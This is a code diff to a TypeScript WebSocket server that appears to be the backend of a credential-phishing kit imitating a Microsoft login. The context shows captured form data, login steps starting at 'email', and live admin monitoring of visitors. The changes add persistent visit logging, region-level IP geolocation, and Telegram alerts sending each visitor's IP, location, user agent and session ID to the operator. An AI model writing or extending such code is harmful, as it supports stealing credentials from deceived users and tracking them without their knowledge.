@@ -2,6 +2,7 @@ import type { IncomingMessage } from 'http';
 import type { Server } from 'http';
 import { readFileSync, writeFileSync, mkdirSync, appendFileSync } from 'fs';
 import { join } from 'path';
+import { createHash } from 'crypto';
 import { WebSocketServer, WebSocket } from 'ws';
 import { logger } from './lib/logger.js';
 import { notifyVisitor } from './lib/telegram.js';
@@ -111,9 +112,51 @@ export function deleteCapturesByIp(ip: string): void {
 
 interface Location {
   city: string;
+  region: string;
   country: string;
   countryCode: string;
   flag: string;
+}
+
+export interface VisitHistoryEntry {
+  id: string;
+  anonymousId: string;
+  location: Location;
+  provider: string;
+  userAgent: string;
+  visitedAt: number;
+}
+
+const VISITS_FILE = join(process.cwd(), '.visit-history.json');
+const VISITS_MAX = 1000;
+
+export function readVisitHistory(): VisitHistoryEntry[] {
+  try {
+    const parsed = JSON.parse(readFileSync(VISITS_FILE, 'utf8')) as VisitHistoryEntry[];
+    return Array.isArray(parsed) ? parsed.slice(-VISITS_MAX).reverse() : [];
+  } catch {
+    return [];
+  }
+}
+
+function recordVisit(visitor: Visitor, location: Location): void {
+  try {
+    const existing = readVisitHistory().reverse();
+    if (existing.some(entry => entry.id === visitor.id)) return;
+    const salt = process.env['SESSION_SECRET'] || 'auth-studio-visit-history';
+    const anonymousId = createHash('sha256').update(`${salt}:${visitor.ip}`).digest('hex').slice(0, 12);
+    const entry: VisitHistoryEntry = {
+      id: visitor.id,
+      anonymousId,
+      location,
+      provider: visitor.provider,
+      userAgent: visitor.userAgent,
+      visitedAt: visitor.connectedAt,
+    };
+    writeFileSync(VISITS_FILE, JSON.stringify([...existing, entry].slice(-VISITS_MAX)), 'utf8');
+  } catch (err) {
+    logger.warn({ err }, 'Failed to record visit history');
+  }
 }
 
 interface FormEntry {
@@ -188,18 +231,18 @@ async function fetchLocation(ip: string): Promise<Location> {
     clean === '127.0.0.1' || clean === '::1' ||
     clean.startsWith('10.') || clean.startsWith('192.168.') ||
     /^172\.(1[6-9]|2\d|3[01])\./.test(clean);
-  if (isLocal) return { city: 'Local Network', country: 'Local', countryCode: 'XX', flag: '🖥️' };
+  if (isLocal) return { city: 'Local Network', region: 'Local', country: 'Local', countryCode: 'XX', flag: '🖥️' };
   try {
-    const res = await fetch(`http://ip-api.com/json/${clean}?fields=status,city,country,countryCode`);
-    const data = await (res.json() as Promise<{ status: string; city: string; country: string; countryCode: string }>);
+    const res = await fetch(`http://ip-api.com/json/${clean}?fields=status,city,regionName,country,countryCode`);
+    const data = await (res.json() as Promise<{ status: string; city: string; regionName: string; country: string; countryCode: string }>);
     if (data.status === 'success') {
       const flag = data.countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
-      return { city: data.city, country: data.country, countryCode: data.countryCode, flag };
+      return { city: data.city, region: data.regionName, country: data.country, countryCode: data.countryCode, flag };
     }
   } catch (err) {
     logger.warn({ err }, 'geolocation fetch failed');
   }
-  return { city: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐' };
+  return { city: 'Unknown', region: 'Unknown', country: 'Unknown', countryCode: '', flag: '🌐' };
 }
 
 function broadcastToAdmins(data: object) {
@@ -435,7 +478,7 @@ export function setupWebSocket(server: Server) {
         const restoredStep = persisted?.step || (msg['step'] as string) || 'email';
         const visitor: Visitor = {
           id, ws, ip,
-          location: { city: '', country: '', countryCode: '', flag: '' },
+          location: { city: '', region: '', country: '', countryCode: '', flag: '' },
           provider: persisted?.provider || (msg['provider'] as string) || 'microsoft',
           step: restoredStep,
           userAgent: (msg['userAgent'] as string) || '',
@@ -444,8 +487,6 @@ export function setupWebSocket(server: Server) {
           formHistory: persisted ? [...persisted.formHistory] : [],
         };
         visitors.set(id, visitor);
-        notifyVisitor();
-
         // Broadcast immediately so the admin sees the visitor and doesn't miss
         // form-data events that arrive while geolocation is in-flight.
         broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
@@ -465,6 +506,14 @@ export function setupWebSocket(server: Server) {
           const v = visitors.get(id);
           if (v) {
             v.location = location;
+            recordVisit(v, location);
+            notifyVisitor({
+              country: location.country,
+              region: location.region,
+              ip: v.ip,
+              userAgent: v.userAgent,
+              sessionId: v.id,
+            });
             broadcastToAdmins({ type: 'visitor-location', id, location });
           }
         }).catch((err) => logger.warn({ err }, 'Failed to fetch visitor location'));
